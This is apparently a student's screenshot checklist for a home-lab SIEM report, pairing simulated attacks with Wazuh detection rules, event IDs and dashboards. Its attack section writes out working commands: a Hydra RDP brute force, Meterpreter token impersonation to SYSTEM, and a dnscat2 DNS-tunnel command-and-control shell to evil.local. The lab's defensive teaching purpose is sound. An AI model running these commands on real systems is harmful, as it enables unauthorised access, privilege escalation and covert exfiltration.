# Screenshot Requirements for Activity 3 Report
## Student ID: US17502

---

## Infrastructure Screenshots (save to: screenshots/infrastructure/)

### 1. `01_vmware_topology.png`
**What to capture:**
- VMware Workstation showing all 4 VMs (DC01, WS01, Kali, SIEM)
- VM names, IP addresses, and running status visible
- Network adapter configuration (NAT network)

**How to capture:**
- Open VMware Workstation
- Ensure all VMs are powered on
- Go to View → Full Screen (or maximize window)
- Screenshot showing VM library with all systems

### 2. `02_network_diagram.png`
**What to capture:**
- Network topology diagram showing:
  - 10.10.10.0/24 subnet
  - Each VM with IP address
  - Connections between systems
  - SIEM receiving logs from agents

**How to create:**
- Use draw.io, Visio, or PowerPoint
- Simple boxes with labels and arrows
- Include IP addresses and roles

### 3. `03_wazuh_dashboard_initial.png`
**What to capture:**
- Wazuh/Kibana dashboard login page or main dashboard
- URL showing http://10.10.10.5:443 or similar
- Clean dashboard before attacks (baseline)

**How to capture:**
- Open browser to Wazuh Manager web interface
- Screenshot the main "Security events" dashboard
- Show timestamp to prove pre-attack baseline

### 4. `04_agent_deployment_dc01.png`
**What to capture:**
- Windows Server showing Wazuh agent installed
- Services.msc showing "WazuhSvc" running
- Or PowerShell: `Get-Service -Name WazuhSvc`

**How to capture:**
```powershell
# Run on DC01
services.msc
# Find "Wazuh" service, show it's Running
# Screenshot the Services window
```

### 5. `05_agent_deployment_ws01.png`
**What to capture:**
- Windows 10 workstation showing Wazuh agent installed
- Same as above but on WS01

### 6. `06_log_ingestion_verification.png`
**What to capture:**
- Wazuh dashboard showing log events from both Windows agents
- Filter by agent.name showing "DC01" and "WS01"
- Event counts showing data is flowing

**How to capture:**
- In Kibana/Wazuh, go to "Discover" or "Events"
- Apply filter: `agent.name: DC01 OR agent.name: WS01`
- Show last 24 hours with event count visible
- Screenshot showing events are being collected

---

## Attack Execution Screenshots (save to: screenshots/attacks/)

### ATTACK 1: RDP Brute Force

#### 7. `07_hydra_rdp_attack.png`
**What to capture:**
- Kali Linux terminal showing Hydra command execution
- Password attempts scrolling (show failures)
- Command visible: `hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.20`

**How to capture:**
```bash
# On Kali Linux
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.20 -t 4 -V
# Let it run for 30+ attempts, then screenshot
```

#### 8. `08_rdp_success.png`
**What to capture:**
- Hydra showing "[3389][rdp] host: 10.10.10.20   login: administrator   password: Summer2024!"
- Success message clearly visible

#### 9. `09_rdp_connection_established.png`
**What to capture:**
- Remote Desktop connection to 10.10.10.20 from Kali (using Remmina or xfreerdp)
- Windows desktop visible showing successful compromise
- Timestamp and logged-in user visible

**How to capture:**
```bash
# On Kali
xfreerdp /u:administrator /p:Summer2024! /v:10.10.10.20
# Screenshot the RDP session window
```

### ATTACK 2: Privilege Escalation

#### 10. `10_meterpreter_session.png`
**What to capture:**
- Metasploit meterpreter session established
- `meterpreter >` prompt visible
- Output of `getuid` showing current user (before escalation)

**How to capture:**
```bash
# On Kali after getting meterpreter session
meterpreter > getuid
# Screenshot showing user context
```

#### 11. `11_token_impersonation.png`
**What to capture:**
- Incognito module loaded
- Output of `list_tokens -u` showing available tokens
- Command `impersonate_token "NT AUTHORITY\\SYSTEM"` executed

**How to capture:**
```bash
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
# Screenshot all three commands and output
```

#### 12. `12_system_privileges_achieved.png`
**What to capture:**
- `getuid` now showing "NT AUTHORITY\SYSTEM"
- Proof of successful privilege escalation

**How to capture:**
```bash
meterpreter > getuid
# Screenshot showing SYSTEM level access
```

### ATTACK 3: DNS Tunneling

#### 13. `13_dnscat2_server.png`
**What to capture:**
- Kali terminal showing dnscat2 server running
- Command: `ruby dnscat2.rb --dns "domain=evil.local,host=10.10.10.100"`
- Server listening message

**How to capture:**
```bash
# On Kali
cd /opt/dnscat2/server
ruby dnscat2.rb --dns "domain=evil.local,host=10.10.10.100"
# Screenshot showing server started
```

#### 14. `14_dnscat2_client_connection.png`
**What to capture:**
- Windows PowerShell showing dnscat2 client execution
- Connection established to C2 server

**How to capture:**
```powershell
# On compromised Windows WS01
.\dnscat2.ps1 -Domain evil.local -DNSServer 10.10.10.100
# Screenshot PowerShell window
```

#### 15. `15_dns_c2_session_active.png`
**What to capture:**
- Kali server showing established session
- Commands being executed through tunnel
- Data transfer statistics

**How to capture:**
```bash
# In dnscat2 server terminal after client connects
dnscat2> session -i 1
command (client) 1> shell
# Screenshot showing interactive shell through DNS tunnel
```

#### 16. `16_wireshark_dns_traffic.png`
**What to capture:**
- Wireshark capture on Kali showing DNS queries
- Filter: `dns` or `udp.port == 53`
- Long TXT record queries visible
- Unusual subdomain patterns

**How to capture:**
- Start Wireshark on Kali before launching attack
- Capture on interface connected to 10.10.10.0/24
- Apply DNS filter
- Screenshot showing anomalous DNS traffic

---

## Detection Screenshots (save to: screenshots/detection/)

### DETECTION 1: Brute Force

#### 17. `17_brute_force_alert_triggered.png`
**What to capture:**
- Wazuh alert showing Rule ID 100010 triggered
- Alert description: "Possible RDP brute force attack"
- Source IP: 10.10.10.100, Destination: 10.10.10.20
- Alert level: 10 (High)

**How to capture:**
- Navigate to Wazuh → Security Events
- Filter: `rule.id: 100010`
- Click on alert to expand details
- Screenshot showing full alert information

#### 18. `18_brute_force_event_timeline.png`
**What to capture:**
- Timeline graph showing spike in failed authentication events (EventID 4625)
- Time period covering attack duration
- Clear visual spike above baseline

**How to capture:**
- Go to Wazuh → Events → Visualizations
- Create/view histogram of authentication events
- Time range: Last 1 hour during attack
- Screenshot showing dramatic spike

#### 19. `19_brute_force_event_details.png`
**What to capture:**
- Raw Event ID 4625 (failed logon) details from Windows Security log
- Fields visible:
  - SubjectUserName: administrator
  - FailureReason: Unknown user name or bad password
  - IpAddress: 10.10.10.100
  - LogonType: 10 (RemoteInteractive)

**How to capture:**
- In Wazuh, expand any 4625 event
- Show JSON or formatted event details
- Screenshot showing key fields

#### 20. `20_brute_force_success_correlation.png`
**What to capture:**
- Rule ID 100011 alert: "RDP brute force attack succeeded"
- Shows EventID 4624 (successful logon) immediately after 847 failures
- Correlation between failed attempts and final success

### DETECTION 2: Privilege Escalation

#### 21. `21_privilege_escalation_alert.png`
**What to capture:**
- Wazuh alert for Rule ID 100020
- Description: "Suspicious privilege escalation - Medium to System integrity level"
- MITRE ATT&CK tag: T1134 visible
- Alert level: 12 (Critical)

**How to capture:**
- Filter events: `rule.id: 100020`
- Expand alert details
- Screenshot showing MITRE technique mapping

#### 22. `22_process_integrity_anomaly.png`
**What to capture:**
- Event ID 4688 (process creation) showing:
  - Parent Process: rundll32.exe (Medium Integrity)
  - New Process: cmd.exe (System Integrity)
  - TokenElevationType changes
- Clear violation of normal process hierarchy

**How to capture:**
- Search for EventID 4688 during attack timeframe
- Filter by Process Integrity Level changes
- Screenshot event showing integrity level escalation

#### 23. `23_token_impersonation_detection.png`
**What to capture:**
- Sysmon Event ID 10 (Process Access) or similar
- Suspicious process (rundll32.exe) accessing LSASS or high-privilege process
- Or custom rule 100021 alert if triggered

**How to capture:**
- Search Sysmon logs during privilege escalation
- Look for process access to privileged targets
- Screenshot showing suspicious behavior

### DETECTION 3: DNS Tunneling

#### 24. `24_dns_tunneling_alert.png`
**What to capture:**
- Wazuh alert for Rule ID 100030
- Description: "Possible DNS tunneling - Excessive TXT queries"
- Frequency: 50+ queries in 60 seconds
- MITRE: T1071.004

**How to capture:**
- Filter: `rule.id: 100030 OR rule.id: 100031`
- Screenshot alert with details

#### 25. `25_dns_query_volume_spike.png`
**What to capture:**
- Graph/chart showing DNS query volume over time
- Baseline: 3-5 queries/minute
- Attack period: 180+ queries/minute (6000% increase)
- Clear visual anomaly

**How to capture:**
- Create visualization: DNS queries over time
- Y-axis: Query count, X-axis: Time
- Screenshot showing dramatic spike during attack

#### 26. `26_dns_query_analysis.png`
**What to capture:**
- Table showing actual DNS queries with:
  - Query Type: TXT
  - Domain: *.evil.local
  - Subdomain length: 50+ characters
  - Random-looking encoded data in subdomains

**How to capture:**
- Query DNS logs: `dns.qtype: TXT AND dns.qdomain: *evil.local*`
- Show table with columns: timestamp, query type, domain, response size
- Screenshot showing anomalous patterns

#### 27. `27_dns_entropy_analysis.png`
**What to capture:**
- Statistical analysis showing subdomain entropy
- Normal domains: entropy 2-4
- Tunneled domains: entropy 7+ (random data)
- Can be custom visualization or table

**How to capture:**
- If using custom analytics, show entropy calculation results
- Or show sample queries with obviously random subdomains
- Highlight high-entropy indicators

### DETECTION 4: Correlation Dashboard

#### 28. `28_security_operations_dashboard.png`
**What to capture:**
- Custom dashboard showing all three attacks
- Panels showing:
  - Authentication timeline (spike during brute force)
  - Privilege escalation alerts
  - DNS query volume
  - MITRE ATT&CK tactics detected
  - Alert severity distribution

**How to capture:**
- Load the kibana_dashboard.json configuration
- View full dashboard showing all security events
- Screenshot entire dashboard (may need to scroll/stitch)

#### 29. `29_mitre_attack_mapping.png`
**What to capture:**
- Wazuh showing MITRE ATT&CK techniques detected:
  - T1110.001 (Brute Force)
  - T1134 (Token Impersonation)
  - T1071.004 (DNS Tunneling)
- Visualization showing techniques by frequency

**How to capture:**
- Navigate to MITRE ATT&CK module in Wazuh
- Show detected techniques with counts
- Screenshot the MITRE matrix or table

#### 30. `30_alert_investigation_workflow.png`
**What to capture:**
- Example of investigating one alert end-to-end
- Shows: Initial alert → Raw logs → Correlation → Response action
- Demonstrates SIEM investigation process

**How to capture:**
- Pick one high-severity alert (e.g., brute force success)
- Show the investigation workflow in SIEM
- Document what analyst would see and do

---

## Additional Helpful Screenshots (Optional but Recommended)

#### 31. `31_custom_rules_configuration.png`
**What to capture:**
- Wazuh showing custom rules XML loaded
- Management → Rules → Custom rules section
- Screenshot showing rules 100010-100061 active

#### 32. `32_false_positive_example.png`
**What to capture:**
- Example of legitimate activity that triggered alert
- Explanation of why it's false positive
- Demonstrates understanding of alert tuning

#### 33. `33_correlation_rule_editor.png`
**What to capture:**
- Screenshot of correlation rule configuration
- Shows how frequency and timeframe parameters work
- Educational value for report

---

## Tips for Quality Screenshots:

1. **Resolution**: Use at least 1920x1080 or capture high-DPI
2. **Annotations**: Use red boxes/arrows to highlight key areas
3. **Timestamps**: Ensure visible to prove temporal correlation
4. **Context**: Show enough surrounding information for clarity
5. **Consistency**: Use same tools/themes throughout (dark mode vs light)
6. **Filename**: Use descriptive names matching this document
7. **Format**: Save as PNG (lossless) not JPG

---

## Screenshot Organization Checklist:

```
activity3-siem-attacks/screenshots/
├── infrastructure/
│   ├── 01_vmware_topology.png
│   ├── 02_network_diagram.png
│   ├── 03_wazuh_dashboard_initial.png
│   ├── 04_agent_deployment_dc01.png
│   ├── 05_agent_deployment_ws01.png
│   └── 06_log_ingestion_verification.png
│
├── attacks/
│   ├── 07_hydra_rdp_attack.png
│   ├── 08_rdp_success.png
│   ├── 09_rdp_connection_established.png
│   ├── 10_meterpreter_session.png
│   ├── 11_token_impersonation.png
│   ├── 12_system_privileges_achieved.png
│   ├── 13_dnscat2_server.png
│   ├── 14_dnscat2_client_connection.png
│   ├── 15_dns_c2_session_active.png
│   └── 16_wireshark_dns_traffic.png
│
└── detection/
    ├── 17_brute_force_alert_triggered.png
    ├── 18_brute_force_event_timeline.png
    ├── 19_brute_force_event_details.png
    ├── 20_brute_force_success_correlation.png
    ├── 21_privilege_escalation_alert.png
    ├── 22_process_integrity_anomaly.png
    ├── 23_token_impersonation_detection.png
    ├── 24_dns_tunneling_alert.png
    ├── 25_dns_query_volume_spike.png
    ├── 26_dns_query_analysis.png
    ├── 27_dns_entropy_analysis.png
    ├── 28_security_operations_dashboard.png
    ├── 29_mitre_attack_mapping.png
    └── 30_alert_investigation_workflow.png
```

**Total Required: 30 screenshots minimum**  
**Recommended: 35-40 including optional context shots**

---

## In the Report:

Reference screenshots using format:
- "As shown in Figure 1 (see infrastructure/01_vmware_topology.png), the laboratory environment comprised four virtual machines..."
- "The brute-force attack successfully compromised the administrator account after 847 attempts (Figure 8, attacks/08_rdp_success.png)..."
- "SIEM detection was immediate, triggering Rule 100010 within 3 minutes of attack initiation (Figure 17, detection/17_brute_force_alert_triggered.png)..."

This provides professional academic documentation with clear evidence supporting all claims in your report.
